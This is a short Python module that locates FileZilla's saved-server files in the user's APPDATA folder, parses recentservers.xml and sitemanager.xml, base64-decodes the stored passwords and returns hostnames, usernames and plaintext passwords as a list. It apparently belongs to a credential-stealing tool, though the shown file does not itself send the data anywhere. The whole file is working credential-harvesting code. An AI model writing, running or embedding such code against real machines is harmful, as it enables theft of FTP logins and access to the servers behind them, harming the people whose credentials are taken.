
# Import modules
import os
from xml.dom import minidom
from base64 import b64decode

__filezilla = os.getenv("APPDATA") + "\\FileZilla\\"

""" Fetch servers from FileZilla """
def Get():
    global credentials
    credentials = []
    # Check path
    if not os.path.exists(__filezilla):
        return []
    # Path
    recentserversPath = __filezilla + "recentservers.xml"
    sitemanagerPath = __filezilla + "sitemanager.xml"

    # Read recent servers
    if os.path.exists(recentserversPath):
        xmldoc = minidom.parse(recentserversPath)
        servers = xmldoc.getElementsByTagName("Server")
        for node in servers:
            server = {
                "hostname": "ftp://" + node.getElementsByTagName("Host")[0].firstChild.data + ":" + node.getElementsByTagName("Port")[0].firstChild.data + "/",
                "username": node.getElementsByTagName("User")[0].firstChild.data,
                "password": b64decode(node.getElementsByTagName("Pass")[0].firstChild.data).decode()
            }
            credentials.append(server)

    # Read sitemanager
    if os.path.exists(sitemanagerPath):
        xmldoc = minidom.parse(sitemanagerPath)
        servers = xmldoc.getElementsByTagName("Server")
        for node in servers:
            server = {
                "hostname": "ftp://" + node.getElementsByTagName("Host")[0].firstChild.data + ":" + node.getElementsByTagName("Port")[0].firstChild.data + "/",
                "username": node.getElementsByTagName("User")[0].firstChild.data,
                "password": b64decode(node.getElementsByTagName("Pass")[0].firstChild.data).decode()
            }
            credentials.append(server)

    return credentials